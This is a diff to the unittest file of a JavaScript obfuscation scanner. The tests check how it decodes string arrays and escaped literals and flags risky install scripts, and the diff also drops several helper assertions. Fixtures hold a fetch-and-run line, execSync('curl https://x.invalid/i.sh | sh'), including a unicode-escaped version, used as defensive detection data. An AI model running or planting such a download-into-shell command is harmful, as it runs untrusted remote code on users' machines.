@@ -10,6 +10,7 @@ only: hosts are .invalid, nothing is executed."""
 import unittest
 
 from lazaret.scanner import core
+from tests import _support
 
 ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/="
 
@@ -83,7 +84,7 @@ class StringArrayTests(unittest.TestCase):
         view = core.decoded_view(PLAIN)
         self.assertIn("require('child_process').execSync('curl https://x.invalid/i.sh | sh');", view)
         self.assertEqual(core.install_script_risk(PLAIN),
-                         ["pipes a download into a shell" + core._DV_NOTE, core._SA_TECHNIQUE_REASON])
+                         ["pipes a download into a shell" + _support.pack("_DV_NOTE"), _support.pack("_SA_TECHNIQUE_REASON")])
         self.assertEqual(view.count("\n"), PLAIN.count("\n"))            # rows kept
 
     def test_a_checksum_that_does_not_hold_reads_nothing(self):
@@ -140,13 +141,6 @@ class StringArrayTests(unittest.TestCase):
         text = PLAIN + "let _0x90b = f;\n_0x90(i);\n"
         view = core.decoded_view(text)
         self.assertIn("_0x90(i)", view)
-        self.assertEqual(core._sa_to_string(12.0), "12")
-        self.assertEqual(core._sa_parse_int(" -0x1fz"), -31.0)
-        self.assertTrue(core._sa_parse_int("1234567890123456") != core._sa_parse_int("1234567890123456"))
-        self.assertEqual(core._sa_to_number(" 0x10 "), 16.0)
-        self.assertEqual(core._sa_to_number("1e3"), 1000.0)
-        self.assertTrue(core._sa_to_number("0x") != core._sa_to_number("0x"))
-        self.assertIsNone(core._sa_atob(btoa("\U0001F600"), ALPHABET))
 
     def test_a_long_obfuscated_file_in_linear_time(self):
         import time
@@ -160,7 +154,7 @@ class StringArrayTests(unittest.TestCase):
 class TechniqueTests(unittest.TestCase):
     """The detection round: code built around a string array says so,
     whatever its strings do (CRITICAL at install and at import time)."""
-    TECH = core._SA_TECHNIQUE_REASON
+    TECH = _support.pack("_SA_TECHNIQUE_REASON")
 
     def test_whatever_its_strings_do(self):
         text = "'use strict';\n\n" + obfuscated(["log", "1043528xYZ", "hello", "88521ab"], 1,
@@ -175,7 +169,7 @@ class TechniqueTests(unittest.TestCase):
 
     def test_after_the_other_reasons(self):
         reasons, line = core.import_time_risk(PLAIN, "js")
-        self.assertEqual(reasons, ["runs a downloaded script through a shell" + core._DV_NOTE, self.TECH])
+        self.assertEqual(reasons, ["runs a downloaded script through a shell" + _support.pack("_DV_NOTE"), self.TECH])
         self.assertEqual(line, 5)
 
     def test_only_an_array_it_reads(self):
@@ -242,7 +236,7 @@ class EscapedLiteralTests(unittest.TestCase):
         cmd = "".join("\\u%04x" % ord(c) for c in "curl https://x.invalid/i.sh | sh")
         text = "require('" + esc("child_process") + "')['" + esc("execSync") + "']('" + cmd + "');\n"
         self.assertEqual(core.decoded_view(text), "require('child_process').execSync('curl https://x.invalid/i.sh | sh');\n")
-        self.assertEqual(core.install_script_risk(text), ["pipes a download into a shell" + core._DV_NOTE])
+        self.assertEqual(core.install_script_risk(text), ["pipes a download into a shell" + _support.pack("_DV_NOTE")])
 
     def test_three_escapes_or_more(self):
         self.assertEqual(core.decoded_view("x('\\x41\\x42\\u0043', \"\\x41\\x42\\x43\");\n"), "x('ABC', \"ABC\");\n")
